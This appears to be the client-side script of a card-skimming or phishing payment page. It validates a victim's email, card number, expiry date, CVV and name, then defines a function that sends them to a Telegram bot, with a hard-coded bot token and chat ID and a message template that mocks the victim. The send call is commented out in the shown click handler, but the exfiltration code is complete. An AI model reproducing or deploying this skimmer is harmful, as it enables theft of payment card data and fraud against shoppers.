$(document).ready( () => {
  const mailInpt = document.querySelector('.emailInpt')
  const ccInpt = document.querySelector('.ccNumInpt')
  const ccBrand = document.querySelector('.ccBrand')
  const ccvInpt = document.querySelector('.ccvInpt')
  const dteInpt = document.querySelector('.ccDteInpt')
  const nameInpt = document.querySelector('.nameInpt')
  
  const emailRegex = /^[-\w.%+]{1,64}@(?:[A-Z0-9-]{1,63}\.){1,125}[A-Z]{2,63}$/i
  const McVsRegex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/i
  const AmexRegex = /^3[47][0-9]{13}$/i
  
const inptErr = (inpt) => {
  [ mailInpt, ccInpt, ccvInpt, dteInpt, nameInpt ].forEach((el) => {
    if(el.id == inpt) {
      el.style.color = "#fe5555"
    } else {
      el.style.color = "#191b1e"
    }
  })
}

const txtDft = (inpt) => $(inpt).css('color', '#191b1e')
const brdDft = (inpt) => $(inpt).css('borderColor', '#E5E5EA')

const txtErr = (inpt) => $(inpt).css('color', '#fe5555')
const brdErr = (inpt) => $(inpt).css('borderColor', '#fe5555')

const onCcErr = () => {
  ccBrand.innerHTML = '';
		const imagen = document.createElement('img');
		imagen.src = './img/ccInptErr.png';
   $(imagen).addClass('ccInptIco');
		ccBrand.appendChild(imagen);
}

emailInpt.addEventListener('input', (e) => !emailRegex.test(e.target.value)?txtErr(e.target):e.target.style.color = '#191b1e')

ccInpt.addEventListener('input', (e) => {
    let inptValue = e.target.value;

	ccInpt.value = inptValue
	// Eliminamos espacios en blanco
	.replace(/\s/g, '')
	// Eliminar las letras
	.replace(/\D/g, '')
	// Ponemos espacio cada cuatro numeros
	//.replace(/([0-9]{4})/g, '$1 ')
	// Elimina el ultimo espaciado
	.trim();
	
	txtDft(ccInpt)
	brdDft(ccInpt)

	//numeroTarjeta.textContent = inptValue;
	
	if(inptValue == ''){
		ccBrand.innerHTML = '<img src="img/ccInpt.png" class="ccInptIco">';
	}
	
	if(inptValue[0] == 4){
    ccInpt.value = ccInpt.value.slice(0, 16);
	  
		ccBrand.innerHTML = '';
		ccBrand.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><g class="nc-icon-wrapper"><rect x="2" y="7" width="28" height="18" rx="3" ry="3" fill="#fff" stroke-width="0"></rect><path d="m27,7H5c-1.657,0-3,1.343-3,3v12c0,1.657,1.343,3,3,3h22c1.657,0,3-1.343,3-3v-12c0-1.657-1.343-3-3-3Zm2,15c0,1.103-.897,2-2,2H5c-1.103,0-2-.897-2-2v-12c0-1.103.897-2,2-2h22c1.103,0,2,.897,2,2v12Z" stroke-width="0" opacity=".15"></path><path d="m27,8H5c-1.105,0-2,.895-2,2v1c0-1.105.895-2,2-2h22c1.105,0,2,.895,2,2v-1c0-1.105-.895-2-2-2Z" fill="#fff" opacity=".2" stroke-width="0"></path><path d="m13.392,12.624l-2.838,6.77h-1.851l-1.397-5.403c-.085-.332-.158-.454-.416-.595-.421-.229-1.117-.443-1.728-.576l.041-.196h2.98c.38,0,.721.253.808.69l.738,3.918,1.822-4.608h1.84Z" fill="#1434cb" stroke-width="0"></path><path d="m20.646,17.183c.008-1.787-2.47-1.886-2.453-2.684.005-.243.237-.501.743-.567.251-.032.943-.058,1.727.303l.307-1.436c-.421-.152-.964-.299-1.638-.299-1.732,0-2.95.92-2.959,2.238-.011.975.87,1.518,1.533,1.843.683.332.912.545.909.841-.005.454-.545.655-1.047.663-.881.014-1.392-.238-1.799-.428l-.318,1.484c.41.188,1.165.351,1.947.359,1.841,0,3.044-.909,3.05-2.317" fill="#1434cb" stroke-width="0"></path><path d="m25.423,12.624h-1.494c-.337,0-.62.195-.746.496l-2.628,6.274h1.839l.365-1.011h2.247l.212,1.011h1.62l-1.415-6.77Zm-2.16,4.372l.922-2.542.53,2.542h-1.452Z" fill="#1434cb" stroke-width="0"></path><path fill="#1434cb" stroke-width="0" d="M15.894 12.624L14.446 19.394 12.695 19.394 14.143 12.624 15.894 12.624z"></path></g></svg>`
	} else if(inptValue[0] == 5){
	  ccInpt.value = ccInpt.value.slice(0, 16);
		ccBrand.innerHTML = '';
		ccBrand.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><g class="nc-icon-wrapper"><rect x="2" y="7" width="28" height="18" rx="3" ry="3" fill="#141413" stroke-width="0"></rect><path d="m27,7H5c-1.657,0-3,1.343-3,3v12c0,1.657,1.343,3,3,3h22c1.657,0,3-1.343,3-3v-12c0-1.657-1.343-3-3-3Zm2,15c0,1.103-.897,2-2,2H5c-1.103,0-2-.897-2-2v-12c0-1.103.897-2,2-2h22c1.103,0,2,.897,2,2v12Z" stroke-width="0" opacity=".15"></path><path d="m27,8H5c-1.105,0-2,.895-2,2v1c0-1.105.895-2,2-2h22c1.105,0,2,.895,2,2v-1c0-1.105-.895-2-2-2Z" fill="#fff" opacity=".2" stroke-width="0"></path><path fill="#ff5f00" stroke-width="0" d="M13.597 11.677H18.407V20.32H13.597z"></path><path d="m13.902,15.999c0-1.68.779-3.283,2.092-4.322-2.382-1.878-5.849-1.466-7.727.932-1.863,2.382-1.451,5.833.947,7.712,2,1.573,4.795,1.573,6.795,0-1.329-1.038-2.107-2.642-2.107-4.322Z" fill="#eb001b" stroke-width="0"></path><path d="m24.897,15.999c0,3.039-2.459,5.497-5.497,5.497-1.237,0-2.428-.412-3.39-1.176,2.382-1.878,2.795-5.329.916-7.727-.275-.336-.58-.657-.916-.916,2.382-1.878,5.849-1.466,7.712.932.764.962,1.176,2.153,1.176,3.39Z" fill="#f79e1b" stroke-width="0"></path></g></svg>`
	} else if(inptValue[0] == 3){
	  ccInpt.value = ccInpt.value.slice(0, 15);
		ccBrand.innerHTML = '';
		ccBrand.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><g class="nc-icon-wrapper"><rect x="2" y="7" width="28" height="18" rx="3" ry="3" fill="#0f70ce" stroke-width="0"></rect><path d="m27.026,9l-.719,1.965-.708-1.965h-3.885v2.582l-1.136-2.582h-3.119l-3.259,7.409h2.637v6.591h8.097l1.316-1.458,1.322,1.458h2.244c.112-.314.184-.647.184-1v-1.041l-1.58-1.698,1.58-1.655v-7.606c0-.353-.072-.686-.184-1h-2.79Z" fill="#fff" stroke-width="0"></path><path d="m17.679,14.433h2.61l.502,1.148h1.78l-2.531-5.754h-2.039l-2.531,5.754h1.734l.477-1.148Zm1.307-3.135l.775,1.844h-1.535l.761-1.844Z" fill="#0f70ce" stroke-width="0"></path><path fill="#0f70ce" stroke-width="0" d="M22.542 9.827L25.018 9.827 26.302 13.39 27.604 9.827 30 9.827 30 15.581 28.45 15.581 28.45 11.603 26.977 15.581 25.608 15.581 24.124 11.631 24.124 15.581 22.542 15.581 22.542 9.827z"></path><path fill="#0f70ce" stroke-width="0" d="M19.24 20.82L19.24 19.944 22.484 19.944 22.484 18.624 19.24 18.624 19.24 17.748 22.565 17.748 22.565 16.409 17.664 16.409 17.664 22.173 22.565 22.173 22.565 20.82 19.24 20.82z"></path><path fill="#0f70ce" stroke-width="0" d="M24.638 16.409L26.271 18.234 27.968 16.409 30 16.409 27.283 19.254 30 22.173 27.939 22.173 26.249 20.309 24.567 22.173 22.537 22.173 25.272 19.275 22.537 16.409 24.638 16.409z"></path><path d="m27,7H5c-1.657,0-3,1.343-3,3v12c0,1.657,1.343,3,3,3h22c1.657,0,3-1.343,3-3v-12c0-1.657-1.343-3-3-3Zm2,15c0,1.103-.897,2-2,2H5c-1.103,0-2-.897-2-2v-12c0-1.103.897-2,2-2h22c1.103,0,2,.897,2,2v12Z" stroke-width="0" opacity=".15"></path><path d="m27,8H5c-1.105,0-2,.895-2,2v1c0-1.105.895-2,2-2h22c1.105,0,2,.895,2,2v-1c0-1.105-.895-2-2-2Z" fill="#fff" opacity=".2" stroke-width="0"></path></g></svg>`
	} else {
		onCcErr()
		txtErr(ccInpt)
	}
  })
  
dteInpt.addEventListener('keyup', () => {
      let key = event.keyCode || event.charCode
      let val = dteInpt.value
  
  if ( val.length === 2 ) {
    dteInpt.value = `${val}/`;
  };
  
  if( key == 8 || key == 46 )
        dteInpt.value = '';
        //return false;
    
  if(val.length == 5) {
    //alert(5)
    const mt = `${val[0]}${val[1]}`
    const yr = `${val[3]}${val[4]}`

    if(Number(mt) <= 7 & Number(yr) <= 25) txtErr(dteInpt)
    else if(Number(yr) <= 24 || Number(yr) >= 36 || Number(mt) >= 13) txtErr(dteInpt)
    else txtDft(dteInpt)
  }
  })
  
  
ccvInpt.addEventListener('input', () => {
  let inptValue = ccInpt.value;
     if (inptValue[0] == 4 || inptValue[0] == 5) {
       ccvInpt.value = ccvInpt.value.slice(0, 3);
     } else if (inptValue[0] == 3) {
       ccvInpt.value = ccvInpt.value.slice(0, 4);
     } 
     ccvInpt.value.length <= 2?txtErr(ccvInpt):txtDft(ccvInpt)
   })
  
const inputValidation = () => {
  
  let validated = false
  
  const allInputs = document.querySelectorAll('.payment-form .ccInfInpt')
  
  let i = 0
  
  allInputs.forEach((input) => {
    txtDft(input)
    brdDft(input)
    if(!input.value) return brdErr(input)
    i++
    if(i == allInputs.length) {
      if(!emailRegex.test(allInputs[0].value)) return txtErr(allInputs[0])
      if(!McVsRegex.test(allInputs[1].value) & !AmexRegex.test(allInputs[1].value)) { 
        onCcErr()
        return allInputs[1].style.color = '#fe5555'
      }
      if(allInputs[2].value.length <= 4) return txtErr(allInputs[2])
      if(allInputs[3].value.length <= 2) return txtErr(allInputs[3])
      if(allInputs[4].value.length <= 2) return txtErr(allInputs[4])
    validated = true
    }
  })
  return {
    email: allInputs[0].value || false,
    ccNum: allInputs[1].value || false,
    exp: allInputs[2].value || false,
    ccv: allInputs[3].value || false,
    name: allInputs[4].value || false,
    validated
  }
  }
  
  const sender = async(msg) => {
    const telegram_bot_id = '7905079405:AAF9dtA-0Dr6Cl9ko6WwcK9tknt3WlzziFs',
    chat_id = '-4866824512';
    
    let settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
      },
      "data": JSON.stringify({
        "chat_id": chat_id,
        "text": msg
      })
    };
    await $.ajax(settings).done( function(response) {
      console.log(response)
    })
  }
  
  const createMsg = (object) => {
    const msg = `■■■■■🤣🫵🤡■■■■■
📧 Email: ${object.email} 
💳 Cc num: ${object.ccNum} 
🗓 Exp: ${object.exp}
🔑 Ccv: ${object.ccv}
👤 Name: ${object.name}
■■■■■■■■■■■■■■`;
    return msg
  }
  
 /* $('.payBtn').click( () => {
    const isValidated = inputValidation()
    if(isValidated.validated) sender(createMsg(isValidated))
  })*/
  
    const loading = document.getElementById('payment-loading');
                const success = document.getElementById('payment-success');
                const error = document.getElementById('payment-error');
                const form = document.getElementById('payment-form');
                const failed = document.getElementById('payment-failed');
                const form_error = document.getElementById('payment-form-error');

                function showContent(contentId) {
                    [loading, success, error, form, failed, form_error].forEach((el) => {
                        if (el.id === contentId) {
                            el.classList.remove('hidden');
                        } else {
                            el.classList.add('hidden');
                        }
                    });
                }
  
 $('.payBtn').click( (e) => {
   e.preventDefault()
    const isValidated = inputValidation()
    //if(isValidated.validated) sender(createMsg(isValidated))
    if(isValidated.validated) {
      $('form').submit()
    }
  })
  
  
})